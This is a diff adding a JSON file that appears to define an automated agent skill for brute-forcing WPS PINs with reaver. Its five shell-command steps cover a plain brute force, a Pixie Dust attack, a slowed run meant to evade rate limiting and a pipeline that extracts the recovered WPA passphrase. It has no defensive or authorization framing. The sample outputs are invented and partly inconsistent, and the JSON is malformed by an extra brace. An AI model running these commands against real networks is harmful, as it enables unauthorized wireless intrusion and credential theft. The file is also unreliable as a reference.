@@ -1,0 +1,30 @@
+{
+  "name": "reaver_wps_pin_attack",
+  "description": "Brute force WPS PIN to recover WPA/WPA2 passphrase using reaver",
+  "pattern": "reaver.*wps|wps.*pin|wps.*attack|reaver.*brute",
+  "parameters": ["interface", "bssid", "channel"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "reaver", "args": ["-i", "{{interface}}mon", "-b", "{{bssid}}", "-c", "{{channel}}", "-vv"]},
+      "expected_output": {"type": "string", "example": "Reaver v1.6.6 WiFi Protected Setup Attack Tool\n\n[+] Waiting for beacon from {{bssid}}\n[+] Received beacon from {{bssid}}\n[+] Trying pin \"12345670\"\n[+] Sending authentication request\n[+] Sending association request\n[+] Associated with {{bssid}} (ESSID: MyNetwork)\n[+] Trying pin \"12345671\"\n[+] Sending EAPOL START request\n[+] Received M1 message\n[+] Sending M2 message\n[Pixie-Dust] WPS pin not found\n[+] Trying pin \"12345672\"\n...\n[+] WPS PIN: '12345678'\n[+] WPA PSK: 'MySecurePassword123'\n[+] AP SSID: 'MyNetwork'"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "reaver", "args": ["-i", "{{interface}}mon", "-b", "{{bssid}}", "-c", "{{channel}}", "-K", "1", "-vv"]},
+      "expected_output": {"type": "string", "example": "Pixie Dust attack enabled (-K 1)\n[Pixie-Dust] Running pixiewps with -e pke -r pkr -s e-hash1 -z e-hash2 -a authkey -n e-nonce\n[Pixie-Dust] WPS PIN: '12345670'\n[+] WPA PSK: 'password123'\nPixie Dust successful - PIN recovered in seconds instead of hours"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "reaver -i {{interface}}mon -b {{bssid}} -c {{channel}} -vv -d 2 -t 5 -r 3:15"]},
+      "expected_output": {"type": "string", "example": "Reaver with delays: -d 2 (2 sec between attempts), -t 5 (5 sec timeout), -r 3:15 (sleep 15 sec after 3 fails)\nSlower but stealthier attack to avoid rate limiting"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "reaver", "args": ["-i", "{{interface}}mon", "-b", "{{bssid}}", "-c", "{{channel}}", "-p", "12345670", "-vv"]},
+      "expected_output": {"type": "string", "example": "Testing specific PIN: 12345670\n[+] Sending M2 message with PIN\n[+] Received M3 message\n[+] Received M5 message\n[+] Received M7 message\n[+] WPS transaction completed\n[+] WPA PSK: 'MyPassword2024'\nPIN confirmed valid"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "reaver -i {{interface}}mon -b {{bssid}} -c {{channel}} -vv 2>&1 | grep -E 'WPS PIN|WPA PSK|AP SSID'"]},
+      "expected_output": {"type": "string", "example": "[+] WPS PIN: '12345678'\n[+] WPA PSK: 'SecurePassword456'\n[+] AP SSID: 'Office_WiFi'\nCredentials recovered successfully"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
